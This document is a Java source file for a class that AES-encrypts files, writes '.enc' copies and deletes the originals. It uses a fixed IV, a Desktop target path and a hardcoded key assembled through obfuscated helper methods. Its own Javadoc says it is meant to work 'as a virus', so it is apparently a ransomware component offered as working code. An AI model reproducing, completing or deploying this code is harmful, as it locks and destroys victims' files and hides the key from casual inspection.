package com.security;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.swing.filechooser.FileSystemView;
import java.io.*;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

/**
 * @Author: Mustafa Jamal
 * @Github: @doct0rX
 */
public class FileEncryption {

    /**
     * fixed VI key so be able to decrypt the file back once you know the key.
     */
    private final static String IV_KEY = "\"bp-<p4*1'XR%aF>";

    /**
     * A String with the transformation that's going to be made while encrypting:
     * <Engine or Algorithm>/<Block Cipher>/<Padding method>
     * Engine: Global transformation
     * Block cipher: Block transformation
     * Padding method: How to handle if a block is not filled
     */
    private final static String TRANSFORMATION = "AES/CBC/PKCS5Padding";

    /**
     * Algorithm used
     */
    private final static String ALGORITHM = "AES";

    /**
     * Max length of the password/key
     */
    private final static int KEY_LENGTH = 16;

    /**
     * Encrypted files extension
     */
    private final static String FILE_EXTENSION = ".enc";

    /**
     * Buffer length used while encrypting/decrypting
     */
    private final static int BUFFER_LENGTH = 16 * 1024;

    /**
     * Sets the FileEncryption to ENCRYPT_MODE
     */
    private final static byte ENCRYPT_MODE = Cipher.ENCRYPT_MODE;

    /**
     * Sets the FileEncryption to DECRYPT_MODE
     */
    private final static byte DECRYPT_MODE = Cipher.DECRYPT_MODE;

    /**
     * Token to use to fill the password in case it's not long enough, password has to
     * be exactly 16 bytes (16 ASCII chars), not more nor less. If the password received on the constructor
     * contains this token, an exception is thrown.
     */
    private static final char PASSWORD_FILL_TOKEN = ' ';

    /**
     * File which is going to suffer the changes
     */
    private File file;

    /**
     * Password to be used
     */
    private String password;

    /**
     * Transformation mode, see FileEncryption.ENCRYPT_MODE and FileEncryption.DECRYPT_MODE
     */
    private byte mode;

    /**
     * If it was given orders to abort the transformation process
     */
    private boolean aborting;

    /**
     * Directory path
     */
    private static String HOME_DIR = String.valueOf(FileSystemView.getFileSystemView().getHomeDirectory());
//    private static final String DIR_PATH = HOME_DIR + "/Desktop/ll";
    private static final String DIR_PATH = HOME_DIR + "/Desktop";

    /**
     * Encryption Password
     * catch the password from a file "com/password.txt"
     */
//    private static String passwd;
//    static {
//        try {
//            passwd = new BufferedReader(new FileReader("/Users/doct0rX/Desktop/projects/GoodX/src/com/password.txt")).readLine();
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
//    }

//    private static final char[] O = { 'A', 'r', 'q', 'a', '-'};
//    private static final char[] U = {'A', 'l', '-'};
//    private static final char[] D = {'0', 'u', 'd'};
//    private static final char[] OUD = new char[11];

    private static char[] buildPassword() {
        char[] OUD = new char[11];
        OUD[0] = 'A';
        OUD[1] = 'r';
        OUD[2] = 'q';
        OUD[3] = 'a';
        OUD[4] = '-';
        OUD[5] = 'A';
        OUD[6] = 'l';
        OUD[7] = '-';
        OUD[8] = '0';
        OUD[9] = 'u';
        OUD[10] = 'd';
        return OUD;
    }

    private static String continuePassword() {
        int numbers[] = {49, 49};
        String str0 = null;

        for (int i : numbers) {
            str0 = Character.toString((char) 49);
        }

        return str0;
    }

    /**
     * Creates a new instance of a file encryption/decryption
     * that should be completed by calling main() as it must be working as a virus to encrypt then try to decrypt the file using the the key.
     * -- call encrypt on main() && call decrypt on start()
     * @param path     String with the ABSOLUTE path to the file that will be
     *                 decrypted/encrypted
     * @param password Password used as the encryption/decryption key
     * @param mode     If it's to Encrypt or to Decrypt, check FileEncryption.ENCRYPT_MODE and
     *                 FileEncryption.DECRYPT_MODE
     * @throws FileEncryptionException Either if the file doesn't exist or if it was given
     *                                 an invalid mode or the password is invalid
     */
    public FileEncryption(String path, String password, byte mode) throws FileEncryptionException {
        if (password.contains(String.valueOf(PASSWORD_FILL_TOKEN)) || password.length() > KEY_LENGTH) {
            throw new FileEncryptionException("Invalid Password");
        }
        this.password = password;
        this.file = new File(path);
        if(!file.exists()) {
            throw new FileEncryptionException("Inexistent File");
        }
        if (mode < 1 || mode > 2) {
            throw new FileEncryptionException("Invalid mode");
        }
        this.mode = mode;
        this.aborting = false;
    }

    /**
     * Gets the accurate destination file:
     * Encrypting file x.txt
     * - If the file x.txt.enc already exists, the system
     * - will check if the file "(1) x.txt.enc" exists, if it does
     * - it will check if "(2) x.txt.enc" exists and so on until it reaches a
     * - fileName that doesn't exist yet
     * Decrypting file x.txt.enc
     * - If the file x.txt already exists, the system
     * - will check if the file "(1) x.txt" exists, if it does
     * - it will check if "(2) x.txt" exists and so on until it reaches
     * - a fileName that doesn't exist yet
     *
     * @param fileName the original fileName
     * @return the accurate destination file
     */
    private File getDestinationFile(String fileName, byte mode) {
        File tempFile = new File(fileName);
        for (int i = 1; tempFile.exists(); i++) {
            fileName = mode == ENCRYPT_MODE ? createAlternativeFileNameToEncrypt(i) : createAlternativeFileNameToDecrypt(i);
            tempFile = new File(fileName);
        }
        return tempFile;
    }

    /**
     * main Method to Encrypt
     */
    private void encrypt() {
        FileInputStream fis = null;
        FileOutputStream fos = null;
        CipherOutputStream cout = null;
        try {
            fis = new FileInputStream(file);
            String fileName = file.getAbsolutePath() + FILE_EXTENSION;
            file = getDestinationFile(fileName, mode);
            fos = new FileOutputStream(file);
            byte[] keyBytes = validatePassword();
            SecretKeySpec key = new SecretKeySpec(keyBytes, ALGORITHM);
            Cipher cipher = Cipher.getInstance(TRANSFORMATION);
            cipher.init(Cipher.ENCRYPT_MODE, key, new IvParameterSpec(IV_KEY.getBytes()));
            cout = new CipherOutputStream(fos, cipher);
            byte[] buffer = new byte[BUFFER_LENGTH];
            int read;
            while (!aborting && ((read = fis.read(buffer)) != -1)) {
                cout.write(buffer, 0, read);
            }
            cout.flush();
            new File(getAbsolutePathWithoutExtension()).delete();   // for deleting the main file after encryting it.
        } catch (IOException | InvalidAlgorithmParameterException | InvalidKeyException | NoSuchAlgorithmException | NoSuchPaddingException e) {
            aborting = true;
        } finally {
            finish(cout, fos, fis);
        }
    }

    /**
     * Main method to decrypt
     */
    private void decrypt() {
        FileInputStream fis = null;
        FileOutputStream fos = null;
        CipherInputStream cin = null;
        try {
            fis = new FileInputStream(file);
            String fileName = getAbsolutePathWithoutExtension();
            file = getDestinationFile(fileName, mode);
            fos = new FileOutputStream(file);
            byte[] keyPassword = validatePassword();
            SecretKeySpec key = new SecretKeySpec(keyPassword, ALGORITHM);
            Cipher decipher = Cipher.getInstance(TRANSFORMATION);
            decipher.init(Cipher.DECRYPT_MODE, key, new IvParameterSpec(IV_KEY.getBytes()));
            cin = new CipherInputStream(fis, decipher);
            byte[] buffer = new byte[BUFFER_LENGTH];
            int read;
            while (!aborting && ((read = cin.read(buffer)) > 0)) {
                fos.write(buffer, 0, read);
                }
            fos.flush();
        } catch (IOException | InvalidAlgorithmParameterException | InvalidKeyException | NoSuchAlgorithmException | NoSuchPaddingException e) {
            aborting = true;
        } finally {
            finish(fos, cin, fis);
        }
    }

    /**
     * Finishes a transformation process by closing all the streams and
     * deleting the file if it was aborted
     * @param closeables the streams
     */
    private void finish(Closeable... closeables) {
        for (Closeable closeable: closeables) {
            try {
                closeable.close();
            } catch (Exception e) {
                // left empty;
            }
            if (aborting) file.delete();    // If it was aborted the file might be corrupted
        }
    }

    private String createAlternativeFileNameToEncrypt(int i) {
        StringBuilder sb = new StringBuilder();
        if (file.getParent() != null) { // If the file is not on a relative directory, all the previous directories are added
            sb.append(file.getParent()).append(File.separator); // Like "C:/.../.../"
        }
        // Adds "(i) " on the beginning as well as the extension
//        sb.append("(").append(i).append(") ").append(file.getName()).append(FILE_EXTENSION);
        sb.append(file.getName()).append(FILE_EXTENSION);
        return sb.toString();
    }

    private String createAlternativeFileNameToDecrypt(int i) {
        StringBuilder sb = new StringBuilder();
        if (file.getParent() != null) { // If the file is not on a relative directory, all the previous directories are added
            sb.append(file.getParent()).append(File.separator); // Like "C:/.../.../"
            file.delete();
        }
//        sb.append("(").append(i).append(") ").append(file.getName(), 0, file.getName().lastIndexOf(FILE_EXTENSION));
        sb.append(file.getName(), 0, file.getName().lastIndexOf(FILE_EXTENSION));
        return sb.toString();
    }

    private byte[] validatePassword() {
        StringBuilder temp = new StringBuilder(password);
        while (temp.length() < KEY_LENGTH) {
            temp.insert(0, PASSWORD_FILL_TOKEN);
        }
        return temp.toString().getBytes();
    }

    /**
     * Gets the absolute path without the extension
     * Example: example/file.txt > example/file
     * @return The absolute path without the extension
     */
    private String getAbsolutePathWithoutExtension() {
        return file.getAbsolutePath().substring(0, file.getAbsolutePath().lastIndexOf('.'));
    }

    /**
     * public getter for the passowrd
     * @return String password
     */
    public static String getPassword() {
        return new String(buildPassword()) + "_" +  continuePassword() + Character.toString((char) 48) + continuePassword();
    }

    public static String getDirPath() {
        return DIR_PATH;
    }

    /**
     * starts the encryption or decryption method on new Thread
     */
    public void start() {
        if (mode == ENCRYPT_MODE) {
            new Thread(this::encrypt).start();
        } else if (mode == DECRYPT_MODE) {
            new Thread(this::decrypt).start();
        }
    }
}
